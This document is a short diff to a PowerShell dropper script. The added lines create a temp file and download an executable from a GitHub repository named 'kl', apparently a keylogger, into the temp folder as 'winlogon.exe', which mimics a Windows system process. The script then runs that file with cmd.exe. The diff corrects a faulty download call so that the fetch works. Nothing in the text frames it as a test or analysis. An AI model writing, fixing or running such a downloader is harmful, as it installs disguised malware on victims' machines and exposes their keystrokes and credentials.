@@ -1,2 +1,3 @@
-(New-Object Net.WebClient).DownloadString("raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\winlogon.exe")
+New-Item "$env:temp\A58F.tmp"
+(New-Object Net.WebClient).DownloadFile("raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\winlogon.exe")
 cmd.exe "$env:temp\winlogon.exe"
